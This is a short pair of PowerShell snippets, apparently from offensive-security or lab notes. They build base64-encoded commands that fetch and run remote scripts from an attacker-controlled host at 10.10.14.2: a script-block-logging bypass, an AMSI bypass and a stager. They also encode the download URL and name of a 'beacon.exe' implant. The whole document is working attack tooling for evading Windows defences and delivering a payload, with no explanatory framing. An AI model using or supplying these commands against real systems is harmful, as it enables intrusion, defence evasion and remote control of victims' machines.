```powershell
$Text = 'iex (iwr http://10.10.14.2:8080/sbloggingbypass.txt -useb);iex (iwr http://10.10.14.2:8080/amsibypass.txt -useb);iex (iwr http://10.10.14.2:8080/stager.ps1 -useb);'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText =[Convert]::ToBase64String($Bytes); $EncodedText
```

```powershell
$Text = 'http://10.10.14.2:8080/beacon.exe'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText =[Convert]::ToBase64String($Bytes); $EncodedText

$Text = 'beacon.exe'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText =[Convert]::ToBase64String($Bytes); $EncodedText
```